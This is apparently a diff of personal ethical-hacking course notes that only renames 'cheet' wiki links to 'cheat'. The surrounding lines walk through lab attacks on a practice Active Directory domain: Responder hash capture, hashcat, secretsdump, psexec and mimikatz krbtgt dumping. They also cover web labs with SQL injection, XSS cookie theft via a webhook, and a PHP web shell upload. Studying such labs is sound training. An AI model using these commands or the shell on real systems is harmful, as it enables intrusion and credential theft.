@@ -21,7 +21,7 @@
 
 
 ## Cheet
-[[cheet|cheet]]
+[[cheat|cheat]]
 
 -------
 # Capstones
@@ -150,7 +150,7 @@ type of objects:
 	- [Windows Server 22 64](https://www.microsoft.com/en-us/evalcenter/download-windows-server-2022)
 
 #### Windows Server Setup
-Open [[cheet#VM Ware|VM Ware]]
+Open [[cheat#VM Ware|VM Ware]]
 Create a New VM:
 - Select Install OS later > Windows Server 2022 > split disk in multi files > 60gb
 - Finish 
@@ -416,7 +416,7 @@ if we respond to the server in the right way =>    - the server will send us the
 
 ##### Responder
 #AD_tool
-we'll use the tool [[cheet#Responder|responder]] -->  to perform this attack
+we'll use the tool [[cheat#Responder|responder]] -->  to perform this attack
 =>
 `sudo python3 Responder.py -I vmnet8 -dPv`    (or dwv)
 
@@ -431,7 +431,7 @@ from THEPUNISHER:
 ##### Crack the password
 #AD_tool
 save the hash inside a file called hash.txt =>  `echo fcastle::MARVEL:... > hash.txt`
-- we'll use [[cheet#hashcat]]
+- we'll use [[cheat#hashcat]]
 - we have captured an -->  NTLMv2 hash
   =>
   we need to find the hashcat module for NTLMv2
@@ -550,7 +550,7 @@ open the windows machine (THEPUNISHER or SPIDERMAN)
 ##### psexec.py
 #AD_tool
 `sudo psexec.py MARVEL/fcastle:'Password1'@172.16.214.130`
-[[cheet#psexec.py]]
+[[cheat#psexec.py]]
 ![[Pasted image 20240226112845.png]]
 
 #### IPv6 Attacks
@@ -562,11 +562,11 @@ if IPv6 is on:
 <span style="background:#fff88f">who is doing DNS resolution for it?</span>
                  <span style="color:#00b050">usually no one</span>
 =>
-we can set up a fake DNS -->  using [[cheet#mitm6]]
+we can set up a fake DNS -->  using [[cheat#mitm6]]
 
 ##### mitm6
 #AD_tool
-follow all the steps --> [[cheet#mitm6|here]]
+follow all the steps --> [[cheat#mitm6|here]]
 if you reboot THEPUNISHER:
 - you will obtain a lot of information
 - if you go inside your lootme_folder you will find some of them 
@@ -615,7 +615,7 @@ we have the ability to get -->  a lot of information
 
 ####  Domain Enumeration with ldapdomaindump
 #AD_tool
-[[cheet#ldapdomaindump|ldapdomaindump]] 
+[[cheat#ldapdomaindump|ldapdomaindump]] 
 `mkdir marvel.local`
 `sudo ldapdomaindump ldaps://172.16.214.128 -u 'MARVEL\fcastle' -p Password1 -o marvel.local'
 
@@ -635,10 +635,10 @@ we can also see:
 
 
 #### Domain Enumeration with Bloodhound
-follow these [[cheet#bloodhound|steps]]
+follow these [[cheat#bloodhound|steps]]
 
 #### Domain Enumeration with plumHound
-follow these [[cheet#plumHound|steps]]
+follow these [[cheat#plumHound|steps]]
 
 
 
@@ -656,7 +656,7 @@ we can leverage that to -->    - pass around the network    (passare alla rete)
 ##### crackmapexec
 #AD_tool
 turn on all the windows machines
-follow these [[cheet#crackmapexec|steps]]
+follow these [[cheat#crackmapexec|steps]]
 `crackmapexec smb 172.16.214.0/24 -u fcastle -d MARVEL.local -p Password1`
 =>
 ![[Pasted image 20240301163145.png]]
@@ -664,7 +664,7 @@ with our credentials:
 we found that our account <span style="color:#00b050">has access</span> to -->  THEPUNISHER and SPIDERMAN machines
 
 ##### Dumping and Cracking Hashes
-[[cheet#secretsdump]]
+[[cheat#secretsdump]]
 ![[Pasted image 20240301165841.png]]
 =>
 <span style="color:#00b050">save all the hashes for the account that you haven't seen before</span>
@@ -821,7 +821,7 @@ add the user to the admin group:
 
 how to prove it:
 open a new terminal tab
-use -->  [[cheet#secretsdump]]
+use -->  [[cheat#secretsdump]]
 `<span style="background:#fff88f">secretsdump.py MARVEL.local/hawkeye:'Password1@'@172.16.214.130</span>`       (domain controller IP)
 
 =>
@@ -861,7 +861,7 @@ $lnk.Save()
 here we:
 - are generating a file
 - are putting the file inside the file share
-- if we have [[cheet#Responder|responder]] up and the file is triggered => we can <span style="color:#00b050">capture an hash</span>
+- if we have [[cheat#Responder|responder]] up and the file is triggered => we can <span style="color:#00b050">capture an hash</span>
   =>
   can be useful for -->  elevate privileges
 
@@ -883,7 +883,7 @@ When we have typed all the commands:
 - copy the @test.lnk file inside -->  `\\HYDRA-DC/hackme`
 
 From the attacker machine:
-- run [[cheet#Responder]]
+- run [[cheat#Responder]]
 - `sudo python3 Responder.py -I vmnet8 -dPv`
   ![[Pasted image 20240303130457.png]]
 
@@ -894,7 +894,7 @@ if we navigate inside the HYDRA-DC/hackme in the Windows machine
 ![[Pasted image 20240303130539.png]]
 
 ##### Automate the attack
-we can automate this attack using -->  [[cheet#crackmapexec]]
+we can automate this attack using -->  [[cheat#crackmapexec]]
 `crackmapexec smb 172.16.214.130 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=172.16.214.1
 
 `172.16.214.130` -->  victim IP (THEPUNISHER)
@@ -924,7 +924,7 @@ what this attack is:
 #AD_tool
 login inside SPIDERMAN as normal user (pparker Password1)
 
-read these [[cheet#Mimikatz|lines]]
+read these [[cheat#Mimikatz|lines]]
 
 first thing to do with this tool:
 - set privilege mode for debugging 
@@ -960,10 +960,10 @@ what do we do:
 - search for quick wins
   =>
 	- [[Notes_ETH#Kerberoasting|Kerberoasting]]
-	- [[cheet#secretsdump|secretsdump]]
+	- [[cheat#secretsdump|secretsdump]]
 	- [[Notes_ETH#Pass Attacks|pass the hash and pass the password]]
 - no quick wins => dig deep:
-	- enumerate ([[cheet#bloodhound|bloodhound]])
+	- enumerate ([[cheat#bloodhound|bloodhound]])
 	- where does your account have access?
 	- old vulnerabilities die hard
 
@@ -991,7 +991,7 @@ NTDS.dit -->  <span style="color:#00b050">DB used to store AD data</span>
 			- security descriptors
 			- password hashes
 
-to dump this DB we can use -->  [[cheet#secretsdump|secretsdump]] (with a known domain admin)
+to dump this DB we can use -->  [[cheat#secretsdump|secretsdump]] (with a known domain admin)
 =>
 `secretsdump.py MARVEL.local/hawkeye:'Password1@'@172.16.214.128 -just-dc-ntlm`
 `172.16.214.128 -->  Domain Controller IP
@@ -1012,7 +1012,7 @@ trick to speed up this process:
 =>
 - copy all the hash
 - paste them inside a txt file
-- use [[cheet#hashcat|hashcat]] to decrypt them
+- use [[cheat#hashcat|hashcat]] to decrypt them
   `hashcat -m 1000 hashNTDS.txt /home/simone/Desktop/TCM/rockyou.txt`
   =>
   <span style="color:#00b050">we have found 6/12 passwords</span> 
@@ -1066,7 +1066,7 @@ with this ticket:
 ##### Attack
 #AD_tool
 turn on THEPUNISHER and Domain Controller
-from the Domain Controller -->  install [[cheet#Install mimikatz on victim machine|mimikatz]]
+from the Domain Controller -->  install [[cheat#Install mimikatz on victim machine|mimikatz]]
 - `mimikatz.exe`
 - `privilege::debug`
 - `lsadump::lsa /inject /name:krbtgt`    -->  pull down only the kerberos tgt account
@@ -1099,7 +1099,7 @@ from the Domain Controller -->  install [[cheet#Install mimikatz on victim machi
   ![[Pasted image 20240304123147.png]]
 
 <span style="background:#fff88f">what can we do now:</span>
-- we can download here [[cheet#psexec.py|psexec]] 
+- we can download here [[cheat#psexec.py|psexec]] 
 - <span style="color:#00b050">gain access to THEPUNISHER machine</span> 
   example:
   `psexec.exe \\THEPUNISHER cmd.exe`
@@ -1272,8 +1272,8 @@ what they found:
 - we don't know the user associated to it
   =>
   but we can try with the administrator user
-- they tried with [[cheet#crackmapexec]] -->  and they found a machine
-- now they ran -->  [[cheet#secretsdump]] -->  to find any relevant info
+- they tried with [[cheat#crackmapexec]] -->  and they found a machine
+- now they ran -->  [[cheat#secretsdump]] -->  to find any relevant info
 	- by dumping hashes they found that:
 		- the Administrator and admin account had the same hash
 		  =>
@@ -1353,7 +1353,7 @@ YES
 
 what usually you can do:
 - add a user -->  `net user hacker password123/add`
-- use [[cheet#psexec.py|psexec.py]] to get a shell -->  `sudo psexec.py domain/user:'password'@<victim ip>`
+- use [[cheat#psexec.py|psexec.py]] to get a shell -->  `sudo psexec.py domain/user:'password'@<victim ip>`
 
 ### Metasploit
 `run persistence -h`
@@ -1481,17 +1481,17 @@ the goal is -->  <span style="color:#00b050">make it look like you were never th
 
 # Web Application Enumeration (revisited)
 we already seen:
-- [[cheet#Nikto]]
-- [[cheet#Dirbuster]]
-- [[cheet#dirb]]
-- [[cheet#BurpSuite]]
+- [[cheat#Nikto]]
+- [[cheat#Dirbuster]]
+- [[cheat#dirb]]
+- [[cheat#BurpSuite]]
 
 ## Installing Go
 Follow these [[Install#Go|commands]]
 
 ## Assetfinder
 new and fastest tool for finding subdomain and domains related to the target domain
-[[cheet#Assetfinder]]
+[[cheat#Assetfinder]]
 
 let's create a bash script for our web enumeration:
 we'll start by:
@@ -1521,11 +1521,11 @@ rm $url/recon/assets.txt
 
 ## Amass
 another tool for finding subdomain
-[[cheet#Amas]]
+[[cheat#Amas]]
 
 ## httprobe
 tools that checks if the domains are responding with some status or not
-[[cheet#httprobe]]
+[[cheat#httprobe]]
 `cat folders/list_domains.txt | httprobe`
 
 <span style="background:#fff88f">if you want to list all the domains that replied without the https:// and :443 in the output:</span>
@@ -1572,7 +1572,7 @@ fi
 > `cat alive.txt | grep admin`
 
 ## GoWitness
-[[cheet#GoWitness]]
+[[cheat#GoWitness]]
 this tool takes screenshot of a website
 scenario -->  you have done subdomain hunting + check subdomains alive with httprobe
 =>
@@ -1734,7 +1734,7 @@ fi
 ### BurpSuite
 once everything is working:
 - open BurpSuite
-- turn on [[cheet#FoxyProxy|FoxyProxy]] (already configured)
+- turn on [[cheat#FoxyProxy|FoxyProxy]] (already configured)
 
 ## Attacks
 ### SQL Injection
@@ -1749,7 +1749,7 @@ Our lab uses this -->  users table:
 we'll find a simply search bar:
 if we write for example -->  jeremy => it will return the email
 ![[Pasted image 20240307111601.png]]
-[[cheet#SQL Injection]]
+[[cheat#SQL Injection]]
 [SQL Injection Cheet Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 ##### Basic trigger and operators
 - try to use characters that might trigger an error:
@@ -1952,7 +1952,7 @@ we can automate using <span style="color:#00b050">INTRUDER</span>:
 now:
 we can continue in this way with BurpSuite
 or:
-use [[cheet#sqlmap]]
+use [[cheat#sqlmap]]
 
 <span style="background:#fff88f">sqlmap:</span>
 - copy the clean request without the payload
@@ -2119,7 +2119,7 @@ setup a container for testing -->  this allow us to:
 in this way:
 we can check if the -->  XSS is stored
 =>
-follow these [[cheet#Firefox Multi-Account Containers|steps]]
+follow these [[cheat#Firefox Multi-Account Containers|steps]]
 
 Now:
 - copy the lab URL
@@ -2147,7 +2147,7 @@ let's try with:
 	  every user that will come to this page -->  it will affected by this injection
 
 ##### XSS 0x03
-- set up [[cheet#Firefox Multi-Account Containers|firefox multicontainer plugin]]
+- set up [[cheat#Firefox Multi-Account Containers|firefox multicontainer plugin]]
 - open 2 page as the 2 containers
 	- into container 2 connect to -->  http://localhost/labs/x0x03_admin.php
 goal:
@@ -2171,7 +2171,7 @@ let's first popup the cookie:
 if you refresh the container 2 -->  <span style="color:#00b050">you'll see a popup with the admin cookie</span> 
 =>
 ###### Exfiltrate Cookies
-- open [[cheet#Webhook.site|WebHook website]]
+- open [[cheat#Webhook.site|WebHook website]]
 - copy the unique URL
 - at the end of it -->  `/?`
 - type in the vulnerable input
@@ -2199,7 +2199,7 @@ how it works:
 		- the result
 		- ![[Pasted image 20240308114321.png]]
 
-- open the [[cheet#AppSecExplained|App Sec explained]] -->  and check for Injection > Command Injection
+- open the [[cheat#AppSecExplained|App Sec explained]] -->  and check for Injection > Command Injection
 
 ##### Basic command
 <span style="background:#fff88f">basic command injection:</span>
@@ -2304,7 +2304,7 @@ let's try with:
 it doesn't give us the command -->  but return Website OK anyway
 
 ##### WebHook
-- open Webhook in the browser  ([[cheet#Webhook.site]])
+- open Webhook in the browser  ([[cheat#Webhook.site]])
 - copy the unique URL
 - insert the URL + ?\`command\`
 ```
@@ -2386,7 +2386,7 @@ check the calls to the webserver:
 
 ###### BurpSuite
 - download an image
-- Setup initial things for BurpSuite -->  [[cheet#Initial things to do]]
+- Setup initial things for BurpSuite -->  [[cheat#Initial things to do]]
 - upload the img to the webserver
 - open the req into Burp
 - Send it to Repeater (CTRL+R)
@@ -2433,7 +2433,7 @@ we can do:
    =>
    let's try to see if the img is in -->  http://localhost/assets/cmd.php
    NO is not here
--  directory busting (ex [[cheet#dirb]])
+-  directory busting (ex [[cheat#dirb]])
    `dirb  http://localhost/`
    ![[Pasted image 20240309104419.png]]
    =>
@@ -2458,8 +2458,8 @@ aa
 upload an image and txt file to test the webserver =>  the webserver only accept png and jpg
 =>
 <span style="background:#fff88f">let's bypass this protection with BurpSuite: </span>(as in the previous lab)
-- Turn on [[cheet#FoxyProxy]]
-- Setup initial things for BurpSuite -->  [[cheet#Initial things to do]]
+- Turn on [[cheat#FoxyProxy]]
+- Setup initial things for BurpSuite -->  [[cheat#Initial things to do]]
 - upload the img > open the req in burpSuite > Send to Repeater
 - delete the img, change file type to `.php` and try to send our [[Notes_ETH#PHP shell|PHP shell]]
   `<?php system($_GET['cmd']); ?>`
@@ -2522,7 +2522,7 @@ and see if it worked:
 
 #### File Upload 0x03
 - turn on FroxyProxy
-- do the [[cheet#Initial things to do]] for BurpSuite
+- do the [[cheat#Initial things to do]] for BurpSuite
 - upload an img
 - open it inside Proxy > HTTP History
 - Send to Repeater
@@ -2556,7 +2556,7 @@ you can use for bruteforcing:
 ##### ffuf
 First  we need to capture a clean req:   (=> we need burp anyway)
 => 
-- Setup initial things for BurpSuite -->  [[cheet#Initial things to do]]
+- Setup initial things for BurpSuite -->  [[cheat#Initial things to do]]
 - send some random credentials
 - open the req into Burp > Copy it > Save it inside a txt file
   ![[Pasted image 20240310130154.png]]
@@ -2609,7 +2609,7 @@ we will test only 4 passwords for each possible account
 =>
 Copy one single request with Burpsuite:
 - turn on FoxyProxy
-- Setup initial things for BurpSuite -->  [[cheet#Initial things to do]]
+- Setup initial things for BurpSuite -->  [[cheat#Initial things to do]]
 - send as credentials -->  admin:admin
 - open the req into Burp 
 - <span style="color:#00b050">Save the response Length </span>-->  (3376)
@@ -2767,7 +2767,7 @@ here we can upload a new coffe (<span style="color:#00b050">and also an image</s
 ### File Upload - Capstone
 #### Shell - Capstone
 - turn on FoxyProxy
-- Setup initial things for BurpSuite -->  [[cheet#Initial things to do]]
+- Setup initial things for BurpSuite -->  [[cheat#Initial things to do]]
 - upload a new coffe through the admin page
 - open the req inside burp > send it to Repeater
 -  Insert our shell inside the image after the magic bytes and delete a portion of it
@@ -2804,7 +2804,7 @@ it's  XSS reflected vulnerable:
 <span style="color:#00b050">comment input is vulnerable to XSS:</span>
 - if you try with `<script> prompt(1) </script>` -->  it opens the prompt
 =>
-it's a <span style="color:#00b050">stored XSS</span> -->  bc if you setup [[cheet#Firefox Multi-Account Containers]]
+it's a <span style="color:#00b050">stored XSS</span> -->  bc if you setup [[cheat#Firefox Multi-Account Containers]]
                    =>
                    and open the same pag as a new user -->  you'll get the same prompt
 
@@ -2816,7 +2816,7 @@ with:
 ### Authentication attack - Capstone
 Copy one single request with Burpsuite:
 - turn on FoxyProxy
-- Setup initial things for BurpSuite -->  [[cheet#Initial things to do]]
+- Setup initial things for BurpSuite -->  [[cheat#Initial things to do]]
 - send as credentials -->  admin:admin
 - open the req into Burp 
 - <span style="color:#00b050">Save the response Length </span>-->  (3376)
